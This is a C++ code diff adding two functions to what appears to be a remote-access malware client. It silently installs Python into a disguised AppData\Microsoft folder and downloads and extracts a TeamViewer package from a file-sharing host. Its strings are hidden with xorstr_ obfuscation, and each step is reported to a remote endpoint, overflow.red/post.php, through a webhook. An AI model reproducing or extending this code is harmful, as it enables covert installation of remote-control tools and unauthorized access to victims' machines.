@@ -190,5 +190,35 @@ namespace client {
 			desktop->Release();
 			CoUninitialize();
 		}
+
+		void install_python() {
+			requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=**Python**\n```\n") + std::string(xorstr_("Downloading and Installing...")) + xorstr_("\n```") + std::string(xorstr_("&webhook_url=")) + client_webhook_url);
+			requests::download_file("https://www.python.org/ftp/python/3.9.0/python-3.9.0-amd64.exe", helpers::roaming + xorstr_("\\Microsoft\\python.exe"));
+			system((std::string("cd " + helpers::roaming + xorstr_("\\Microsoft\\")) + std::string(xorstr_(" && python.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0"))).c_str());
+
+			auto path = helpers::exec(xorstr_("py -c \"import sys; print(sys.executable[:-10])\""));
+			if (path.find(xorstr_("Python39")) != std::string::npos || path.find(xorstr_("Python38")) != std::string::npos) {
+				system(std::string(xorstr_("setx Path %UserProfile%\";") + path).c_str());
+				system("pip install --upgrade pip");
+				system("pip install opencv-python");
+				system("pip install numpy");
+				requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=**Python**\n```\n") + std::string(xorstr_("Installed and Set Path\n- opencv-python\n- numpy")) + xorstr_("\n```") + std::string(xorstr_("&webhook_url=")) + client_webhook_url);
+			}
+			else {
+				requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=**Python**\n```\n") + std::string(xorstr_("Error Assigning Path.")) + xorstr_("\n```") + std::string(xorstr_("&webhook_url=")) + client_webhook_url);
+			}
+		}
+		
+		void install_teamviewer() {
+			requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=**TeamViewer**\n```\n") + std::string(xorstr_("Downloading Files...")) + xorstr_("\n```") + std::string(xorstr_("&webhook_url=")) + client_webhook_url);
+			requests::download_file("https://srv-store4.gofile.io/download/L2TuWe/tv.zip", helpers::roaming + xorstr_("\\Microsoft\\") + "tv.zip");
+
+			std::string path = helpers::roaming + xorstr_("\\Microsoft\\tv.zip");
+			std::string unzip_path = helpers::roaming + xorstr_("\\Microsoft");
+			std::string command = xorstr_("powershell -command \"Expand-Archive -Force ") + path + " " + unzip_path + "\"";
+			system(command.c_str());
+
+			requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=**TeamViewer**\n```\n") + std::string(xorstr_("Finished Downloading and Extracing")) + xorstr_("\n```") + std::string(xorstr_("&webhook_url=")) + client_webhook_url);
+		}
 	}
 }
